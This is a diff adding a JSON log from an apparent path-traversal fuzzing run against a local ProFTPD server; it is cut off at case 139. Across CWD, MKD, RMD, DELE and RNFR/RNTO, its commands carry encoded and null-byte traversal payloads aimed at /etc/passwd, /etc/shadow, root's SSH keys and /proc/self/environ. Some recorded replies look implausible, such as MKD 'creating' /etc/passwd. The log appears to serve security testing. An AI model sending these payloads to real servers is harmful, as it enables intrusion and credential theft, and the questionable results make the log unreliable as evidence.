@@ -1,0 +1,3047 @@
+{
+  "fuzzer": "path_traversal",
+  "target": "ProFTPD 1.3.9 at 127.0.0.1:21",
+  "start_time": "2026-02-13T20:28:42.949507",
+  "test_cases": [
+    {
+      "id": 1,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 2,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 3,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 4,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 5,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../etc/passwd",
+      "response": "550 ../../../../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 6,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../etc/shadow",
+      "response": "550 ../../../../../etc/shadow: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 7,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 8,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../proc/self/environ",
+      "response": "550 ../../../../../proc/self/environ: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 9,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..%2f",
+      "response": "550 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 10,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..%2f..%2f",
+      "response": "550 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 11,
+      "category": "path_traversal_CWD",
+      "command": "CWD %2e%2e/",
+      "response": "550 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 12,
+      "category": "path_traversal_CWD",
+      "command": "CWD %2e%2e%2f",
+      "response": "550 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 13,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..\\",
+      "response": "550 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 14,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..\\..\\",
+      "response": "550 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 15,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..%c0%af",
+      "response": "550 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 16,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..%c1%9c",
+      "response": "550 ..%c1%9c: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 17,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../etc/passwd\u0000.txt",
+      "response": "550 ../../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 18,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 19,
+      "category": "path_traversal_CWD",
+      "command": "CWD ....//",
+      "response": "550 ....//: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 20,
+      "category": "path_traversal_CWD",
+      "command": "CWD ..../",
+      "response": "550 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 21,
+      "category": "path_traversal_CWD",
+      "command": "CWD .../",
+      "response": "550 .../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 22,
+      "category": "path_traversal_CWD",
+      "command": "CWD /etc/passwd",
+      "response": "550 /etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 23,
+      "category": "path_traversal_CWD",
+      "command": "CWD /etc/shadow",
+      "response": "550 /etc/shadow: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 24,
+      "category": "path_traversal_CWD",
+      "command": "CWD /root",
+      "response": "550 /root: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 25,
+      "category": "path_traversal_CWD",
+      "command": "CWD /proc/self/cmdline",
+      "response": "550 /proc/self/cmdline: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 26,
+      "category": "path_traversal_CWD",
+      "command": "CWD /proc/self/environ",
+      "response": "550 /proc/self/environ: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 27,
+      "category": "path_traversal_CWD",
+      "command": "CWD ~root",
+      "response": "550 ~root: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 28,
+      "category": "path_traversal_CWD",
+      "command": "CWD ~root/",
+      "response": "550 ~root/: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 29,
+      "category": "path_traversal_CWD",
+      "command": "CWD ~root/.bashrc",
+      "response": "550 ~root/.bashrc: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 30,
+      "category": "path_traversal_CWD",
+      "command": "CWD /home/ftptest/../../../etc/passwd",
+      "response": "550 /home/ftptest/../../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 31,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 32,
+      "category": "path_traversal_CWD",
+      "command": "CWD /..",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 33,
+      "category": "path_traversal_CWD",
+      "command": "CWD /../../etc/passwd",
+      "response": "550 /../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 34,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../etc/passwd: Not a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 35,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../",
+      "response": "257 \"/home\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 36,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../",
+      "response": "257 \"/\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 37,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../",
+      "response": "257 \"/\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 38,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../",
+      "response": "257 \"/\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 39,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 40,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../etc/shadow",
+      "response": "257 \"/etc/shadow\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 41,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 42,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../proc/self/environ",
+      "response": "257 \"/proc/self/environ\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 43,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..%2f",
+      "response": "257 \"/home/ftptest/..%2f\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 44,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..%2f..%2f",
+      "response": "257 \"/home/ftptest/..%2f..%2f\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 45,
+      "category": "path_traversal_MKD",
+      "command": "MKD %2e%2e/",
+      "response": "257 \"/home/ftptest/%2e%2e\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 46,
+      "category": "path_traversal_MKD",
+      "command": "MKD %2e%2e%2f",
+      "response": "257 \"/home/ftptest/%2e%2e%2f\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 47,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..\\",
+      "response": "257 \"/home/ftptest/..\\\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 48,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..\\..\\",
+      "response": "257 \"/home/ftptest/..\\..\\\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 49,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..%c0%af",
+      "response": "257 \"/home/ftptest/..%c0%af\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 50,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..%c1%9c",
+      "response": "257 \"/home/ftptest/..%c1%9c\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 51,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../etc/passwd\u0000.txt",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 52,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 53,
+      "category": "path_traversal_MKD",
+      "command": "MKD ....//",
+      "response": "257 \"/home/ftptest/..../\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 54,
+      "category": "path_traversal_MKD",
+      "command": "MKD ..../",
+      "response": "257 \"/home/ftptest/....\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 55,
+      "category": "path_traversal_MKD",
+      "command": "MKD .../",
+      "response": "257 \"/home/ftptest/...\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 56,
+      "category": "path_traversal_MKD",
+      "command": "MKD /etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 57,
+      "category": "path_traversal_MKD",
+      "command": "MKD /etc/shadow",
+      "response": "257 \"/etc/shadow\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 58,
+      "category": "path_traversal_MKD",
+      "command": "MKD /root",
+      "response": "257 \"/root\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 59,
+      "category": "path_traversal_MKD",
+      "command": "MKD /proc/self/cmdline",
+      "response": "257 \"/proc/self/cmdline\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 60,
+      "category": "path_traversal_MKD",
+      "command": "MKD /proc/self/environ",
+      "response": "257 \"/proc/self/environ\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 61,
+      "category": "path_traversal_MKD",
+      "command": "MKD ~root",
+      "response": "257 \"/home/ftptest/~root\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 62,
+      "category": "path_traversal_MKD",
+      "command": "MKD ~root/",
+      "response": "257 \"/root\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 63,
+      "category": "path_traversal_MKD",
+      "command": "MKD ~root/.bashrc",
+      "response": "550 ~root/.bashrc: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 64,
+      "category": "path_traversal_MKD",
+      "command": "MKD /home/ftptest/../../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 65,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 66,
+      "category": "path_traversal_MKD",
+      "command": "MKD /..",
+      "response": "257 \"/\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 67,
+      "category": "path_traversal_MKD",
+      "command": "MKD /../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 68,
+      "category": "path_traversal_MKD",
+      "command": "MKD ../../../../../../../../../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 69,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../",
+      "response": "550 ../: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 70,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../",
+      "response": "550 ../../: Device or resource busy\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 71,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../",
+      "response": "550 ../../../: Device or resource busy\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 72,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../",
+      "response": "550 ../../../../: Device or resource busy\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 73,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../etc/passwd",
+      "response": "550 ../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 74,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../etc/shadow",
+      "response": "550 ../../../../../etc/shadow: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 75,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 76,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../proc/self/environ",
+      "response": "550 ../../../../../proc/self/environ: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 77,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 78,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%2f..%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 79,
+      "category": "path_traversal_RMD",
+      "command": "RMD %2e%2e/",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 80,
+      "category": "path_traversal_RMD",
+      "command": "RMD %2e%2e%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 81,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..\\",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 82,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..\\..\\",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 83,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%c0%af",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 84,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%c1%9c",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 85,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../etc/passwd\u0000.txt",
+      "response": "550 ../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 86,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 87,
+      "category": "path_traversal_RMD",
+      "command": "RMD ....//",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 88,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..../",
+      "response": "550 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 89,
+      "category": "path_traversal_RMD",
+      "command": "RMD .../",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 90,
+      "category": "path_traversal_RMD",
+      "command": "RMD /etc/passwd",
+      "response": "550 /etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 91,
+      "category": "path_traversal_RMD",
+      "command": "RMD /etc/shadow",
+      "response": "550 /etc/shadow: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 92,
+      "category": "path_traversal_RMD",
+      "command": "RMD /root",
+      "response": "550 /root: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 93,
+      "category": "path_traversal_RMD",
+      "command": "RMD /proc/self/cmdline",
+      "response": "550 /proc/self/cmdline: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 94,
+      "category": "path_traversal_RMD",
+      "command": "RMD /proc/self/environ",
+      "response": "550 /proc/self/environ: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 95,
+      "category": "path_traversal_RMD",
+      "command": "RMD ~root",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 96,
+      "category": "path_traversal_RMD",
+      "command": "RMD ~root/",
+      "response": "550 ~root/: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 97,
+      "category": "path_traversal_RMD",
+      "command": "RMD ~root/.bashrc",
+      "response": "550 ~root/.bashrc: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 98,
+      "category": "path_traversal_RMD",
+      "command": "RMD /home/ftptest/../../../etc/passwd",
+      "response": "550 /home/ftptest/../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 99,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 100,
+      "category": "path_traversal_RMD",
+      "command": "RMD /..",
+      "response": "550 /..: Device or resource busy\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 101,
+      "category": "path_traversal_RMD",
+      "command": "RMD /../../etc/passwd",
+      "response": "550 /../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 102,
+      "category": "path_traversal_RMD",
+      "command": "RMD ../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 103,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../",
+      "response": "550 ../: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 104,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../",
+      "response": "550 ../../: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 105,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../",
+      "response": "550 ../../../: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 106,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../",
+      "response": "550 ../../../../: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 107,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../etc/passwd",
+      "response": "550 ../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 108,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../etc/shadow",
+      "response": "550 ../../../../../etc/shadow: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 109,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../root/.ssh/authorized_keys",
+      "response": "550 ../../../../../root/.ssh/authorized_keys: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 110,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../proc/self/environ",
+      "response": "550 ../../../../../proc/self/environ: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 111,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..%2f",
+      "response": "550 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 112,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..%2f..%2f",
+      "response": "550 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 113,
+      "category": "path_traversal_DELE",
+      "command": "DELE %2e%2e/",
+      "response": "550 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 114,
+      "category": "path_traversal_DELE",
+      "command": "DELE %2e%2e%2f",
+      "response": "550 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 115,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..\\",
+      "response": "550 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 116,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..\\..\\",
+      "response": "550 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 117,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..%c0%af",
+      "response": "550 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 118,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..%c1%9c",
+      "response": "550 ..%c1%9c: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 119,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../etc/passwd\u0000.txt",
+      "response": "550 ../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 120,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 121,
+      "category": "path_traversal_DELE",
+      "command": "DELE ....//",
+      "response": "550 ....//: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 122,
+      "category": "path_traversal_DELE",
+      "command": "DELE ..../",
+      "response": "550 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 123,
+      "category": "path_traversal_DELE",
+      "command": "DELE .../",
+      "response": "550 .../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 124,
+      "category": "path_traversal_DELE",
+      "command": "DELE /etc/passwd",
+      "response": "550 /etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 125,
+      "category": "path_traversal_DELE",
+      "command": "DELE /etc/shadow",
+      "response": "550 /etc/shadow: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 126,
+      "category": "path_traversal_DELE",
+      "command": "DELE /root",
+      "response": "550 /root: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 127,
+      "category": "path_traversal_DELE",
+      "command": "DELE /proc/self/cmdline",
+      "response": "550 /proc/self/cmdline: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 128,
+      "category": "path_traversal_DELE",
+      "command": "DELE /proc/self/environ",
+      "response": "550 /proc/self/environ: Operation not permitted\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 129,
+      "category": "path_traversal_DELE",
+      "command": "DELE ~root",
+      "response": "550 ~root: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 130,
+      "category": "path_traversal_DELE",
+      "command": "DELE ~root/",
+      "response": "550 ~root/: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 131,
+      "category": "path_traversal_DELE",
+      "command": "DELE ~root/.bashrc",
+      "response": "550 ~root/.bashrc: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 132,
+      "category": "path_traversal_DELE",
+      "command": "DELE /home/ftptest/../../../etc/passwd",
+      "response": "550 /home/ftptest/../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 133,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 134,
+      "category": "path_traversal_DELE",
+      "command": "DELE /..",
+      "response": "550 /..: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 135,
+      "category": "path_traversal_DELE",
+      "command": "DELE /../../etc/passwd",
+      "response": "550 /../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 136,
+      "category": "path_traversal_DELE",
+      "command": "DELE ../../../../../../../../../../etc/passwd",
+      "response": "550 ../../../../../../../../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 137,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 138,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "550 Rename /tmp/pwned_137: Is a directory\r\n",
+      "notes": "After RNFR traversal",
+      "status": "REJECTED"
+    },
+    {
+      "id": 139,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
